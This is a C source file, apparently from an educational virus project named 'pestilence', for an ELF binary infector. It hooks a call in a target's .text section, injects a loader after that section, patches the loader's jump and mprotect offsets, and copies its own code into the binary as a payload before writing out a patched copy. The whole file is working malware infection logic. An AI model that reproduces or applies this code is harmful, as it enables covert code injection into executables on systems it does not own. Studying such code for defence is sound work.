#include "pestilence.h"

void		init_info(t_info *info)
{
	info->text_begin = 0;
	info->text_size = 0;
	info->valid_target = 1;
}

void	hook_call(t_info *info)
{
	int32_t	new_jmp;

	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->call_to_replace) - (size_t)(info->text_begin)) - 5);
	ft_memcpy(info->call_to_replace + 1, &new_jmp, sizeof(new_jmp));
}


void	patch_loader(t_info *info)
{
	int32_t	start;
	int32_t	end;
	int32_t val;

	start = info->text_addr + info->text_size + LOADER_SIZE;
	end = (int32_t)(info->addr_payload + (size_t)(&main) - (size_t)(&ft_memcpy));
	val = end - start - 1;

	// rewrite jmp to payload
	dprintf(1, "val : %d\n", val);
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 3, &val, 4);

// 	start = info->text_addr + info->text_size + LOADER_SIZE + 44;
	end = info->addr_payload;
	val = end - start;
	// rewrite addr for mprotect
	dprintf(1, "val : %#x\n", val);	
	ft_memcpy(info->text_begin + info->text_size + 44, &val, 4);

}

void	inject_loader(t_info *info)
{
	void		*addr;

	addr = &loader;
	hook_call(info);
	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
	patch_loader(info);
}

void	inject_payload(t_info *info)
{
	void		*addr;	

	addr = &ft_memcpy;
	ft_bzero(info->file + info->begin_bss, info->bss_size);
	ft_memcpy(info->file + info->offset_payload, addr, PAYLOAD_SIZE);
}

void	write_file(t_info info, char *name)
{
	int fd = open(name, O_WRONLY | O_CREAT | O_TRUNC);
	write(fd, info.file, info.file_size);
	close(fd);
}

int		main()
{
	write(1, "WOODY\n", 6);
	struct stat		st;
	int				fd = open("test/test", O_RDWR);
	t_info			info;
	
	init_info(&info);
	fstat(fd, &st);
	info.file_size = st.st_size;
	info.file = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	find_text(&info);
	epo_parsing(&info);
	pe_parsing(&info);
	if (info.valid_target == 0)
		return (0);
	dprintf(1, "valid\n");
	inject_loader(&info);
	inject_payload(&info);
	close(fd);
	write_file(info, "test/patched");
	return (0);
}
